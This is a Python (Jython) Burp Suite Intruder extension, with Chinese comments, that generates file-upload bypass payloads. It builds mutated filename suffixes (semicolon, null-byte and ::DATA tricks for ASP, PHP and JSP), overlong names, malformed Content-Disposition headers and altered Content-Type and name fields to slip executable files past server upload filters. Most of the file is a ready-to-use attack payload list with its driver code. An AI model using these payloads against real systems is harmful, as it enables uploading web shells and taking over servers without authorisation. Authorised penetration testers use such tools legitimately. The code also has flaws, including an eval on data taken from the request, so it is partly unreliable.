#!/usr/bin/env python
# -*- coding:utf-8 -*-
from burp import IBurpExtender
from burp import IIntruderPayloadGeneratorFactory
from burp import IIntruderPayloadProcessor
from burp import IIntruderPayloadGenerator
import re
import urllib
#主要是基于burp的文件上传fuzz插件，通过混淆上传文件后缀、文件类型、Content-Disposition等参数来尝试绕过后端限制。
# hard-coded payloads
# [in reality, you would use an extension for something cleverer than this]
# 定义文件后缀
attack_payload=list()
def file_suffix(canshu):
# 文件后缀绕过
    asp_fuzz = ['asp;.jpg', 'asp.jpg', 'asp;jpg', 'asp/1.jpg', 'asp{}.jpg'.format(urllib.unquote('%00')), 'asp .jpg',
'asp_.jpg', 'asa', 'cer', 'cdx', 'ashx', 'asmx', 'xml', 'htr', 'asax', 'asaspp', 'asp;+222.jpg']
    aspx_fuzz = ['asPx', 'aspx .jpg', 'aspx_.jpg', 'aspx;+11.jpg', 'asaspxpx']
    php_fuzz = ['php1', 'php.','php_','php ','php2', 'php3', 'php4', 'php5', 'pHp', 'php .jpg', 'php_.jpg', 'php.jpg', 'php. .jpg','php  jpg','php jpg','jpg/.php','php.123', 'jpg/php', 'jpg/1.php', 'jpg{}.php'.format(urllib.unquote('%00')),'php{}.jpg'.format(urllib.unquote('%00')),'php:1.jpg', 'php::DATA', 'php::DATA','php::DATA......', 'ph\np','\nphp']
    jsp_fuzz = ['.jsp.jpg.jsp', 'jspa', 'jsps', 'jspx', 'jspf', 'jsp .jpg', 'jsp_.jpg']
    suffix_fuzz = asp_fuzz + aspx_fuzz + php_fuzz + jsp_fuzz
    filename_suffix = re.search('filename=".*[.](.*)"', canshu).group(1)
    for  i in suffix_fuzz:
        attack_payload.append(canshu.replace(filename_suffix,i).decode("utf-8"))
    # 超长长文件名
    filename_full =eval( re.findall("filename=(.*)", canshu)[0])
    attack_payload.append(canshu.replace(filename_full,"sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss."+filename_suffix))
#在 Content-Disposition:前添加回车换行
    attack_payload.append(canshu.replace(canshu,'\n'+canshu))
    return attack_payload
#定义Content-Disposition: form-data;变换大小写、增加空格
def Disposition_suffix(canshu):
    disposition=['Content-Disposition:form-data;','Content-Disposition:form-data------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------;','Content Disposition:form-data;','Content-Disposition: form-data;','Content-Disposition:form-data ;','content-Disposition:form-data;','content-Disposition: form-data;','content-Disposition:form-data ;','Content-Disposition:Form-data;','Content-Disposition: Form-data;','Content-Disposition:Form-data ;','content-Disposition:Form-data;','content-Disposition: Form-data;','content-Disposition:Form-data ;','Content-Disposition:~form-data;','Content-Disposition: ~form-data;','Content-Disposition:~form-data ;','content-Disposition:~form-data;','content-Disposition: ~form-data;','content-Disposition:~form-data ;','Content-Disposition:f+orm-data;','Content-Disposition: f+orm-data;','Content-Disposition:f+orm-data ;','content-Disposition:f+orm-data;','content-Disposition: f+orm-data;','content-Disposition:f+orm-data ;','Content-Disposition:form-d+ata;','Content-Disposition: form-d+ata;','Content-Disposition:form-d+ata ;','content-Disposition:form-d+ata;','content-Disposition: form-d+ata;','content-Disposition:form-d+ata ;','Content-Disposition:*;','Content-Disposition: *;','Content-Disposition:* ;','content-Disposition:*;','content-Disposition: *;','content-Disposition:* ;','Content- Disposition:form-data;']
    for i in disposition:
        attack_payload.append(canshu.replace('Content-Disposition: form-data;',i).decode("utf-8"))
    return attack_payload
#定义Content-Type,列举常见的content-type格式
def content_type(canshu):
    content_type=[' application/octet-stream','application/x-001','application/x-www-form-urlencoded','multipart/form-data','text/xml','text/plain','image/jpeg','image/png','text/html',' ','']
    for i in content_type:
        attack_payload.append(canshu.replace(canshu.split(':')[2],i))
    attack_payload.append(canshu.replace('Content-Type','content-type'))
    attack_payload.append(canshu.replace('Content-Type:', 'Content-Type: '))
    return attack_payload
# 定义name参数
def name(canshu):
    name=['Name','name','nAme','namE','name']
    for i in name:
        orign_name=canshu.split(';')[1].split('=')[0]
        attack_payload.append(canshu.replace(orign_name,i))
    return attack_payload
class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory, IIntruderPayloadProcessor):
    # implement IBurpExtender
    def registerExtenderCallbacks(self, callbacks):
        # obtain an extension helpers object
        self._helpers = callbacks.getHelpers()
        # set our extension name
        callbacks.setExtensionName("upload intruder payloads")
        # register ourselves as an Intruder payload generator
        callbacks.registerIntruderPayloadGeneratorFactory(self)
        # register ourselves as an Intruder payload processor
        callbacks.registerIntruderPayloadProcessor(self)
    # implement IIntruderPayloadGeneratorFactory
    def getGeneratorName(self):
        return "upload custom payloads"
    def createNewInstance(self, attack):
        # return a new IIntruderPayloadGenerator to generate payloads for this attack
        return IntruderPayloadGenerator()
    # implement IIntruderPayloadProcessor
    def getProcessorName(self):
        return "Serialized input wrapper"
    def processPayload(self, currentPayload, originalPayload, baseValue):
        # decode the base value
        dataParameter = self._helpers.bytesToString(
            self._helpers.base64Decode(self._helpers.urlDecode(baseValue)))
        # parse the location of the input string in the decoded data
        start = dataParameter.index("input=") + 6
        if start == -1:
            return currentPayload
        prefix = dataParameter[0:start]
        end = dataParameter.index("&", start)
        if end == -1:
            end = len(dataParameter)
        suffix = dataParameter[end:len(dataParameter)]
        # rebuild the serialized data with the new payload
        dataParameter = prefix + self._helpers.bytesToString(currentPayload) + suffix
        return self._helpers.stringToBytes(
                self._helpers.urlEncode(self._helpers.base64Encode(dataParameter)))
# class to generate payloads from a simple list
class IntruderPayloadGenerator(IIntruderPayloadGenerator):
    def __init__(self):
        self._payloadIndex = 0
        # hasMorePayloads方法就是返回一个布尔值，如果_payloadIndex的值比PAYLOADS的个数小，说明没有加载完所有payload，那么就返回true，然后继续返回下一个payload
    def hasMorePayloads(self):
        return self._payloadIndex < 10000
    def getNextPayload(self, baseValue):
        # 获取混淆需要混淆的数据包
        base_list=list()
        for x in  baseValue:
            if int(x)>0:
                base_list.append(x)
        payload1 = "".join(chr(x) for x in base_list)
        if len(attack_payload)==0:
            file_suffix(canshu=payload1)
            Disposition_suffix(canshu=payload1)
            content_type(canshu=payload1)
            name(canshu=payload1)
        payload = attack_payload[self._payloadIndex]
        self._payloadIndex = self._payloadIndex + 1
        return payload
    def reset(self):
        self._payloadIndex = 0
